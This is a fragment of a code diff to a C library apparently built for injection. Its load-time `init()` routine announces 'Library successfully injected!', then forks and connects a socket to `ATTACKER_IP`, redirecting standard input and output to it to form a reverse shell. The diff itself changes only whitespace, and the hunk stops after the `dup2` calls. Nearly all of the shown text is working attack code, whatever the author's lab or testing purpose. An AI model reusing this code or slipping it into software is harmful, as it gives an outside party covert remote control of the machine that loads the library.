@@ -16,7 +16,7 @@ static void init()
 {
     printf("Library successfully injected!\n");
     syslog(LOG_CRIT, "Library called\n");
-    
+
     //Just a sample reverse shell (https://www.revshells.com/)
     pid_t pid = fork();
     if(pid==0){
@@ -24,11 +24,11 @@ static void init()
         struct sockaddr_in revsockaddr;
 
         int sockt = socket(AF_INET, SOCK_STREAM, 0);
-        revsockaddr.sin_family = AF_INET;       
+        revsockaddr.sin_family = AF_INET;
         revsockaddr.sin_port = htons(port);
         revsockaddr.sin_addr.s_addr = inet_addr(ATTACKER_IP);
 
-        connect(sockt, (struct sockaddr *) &revsockaddr, 
+        connect(sockt, (struct sockaddr *) &revsockaddr,
         sizeof(revsockaddr));
         dup2(sockt, 0);
         dup2(sockt, 1);
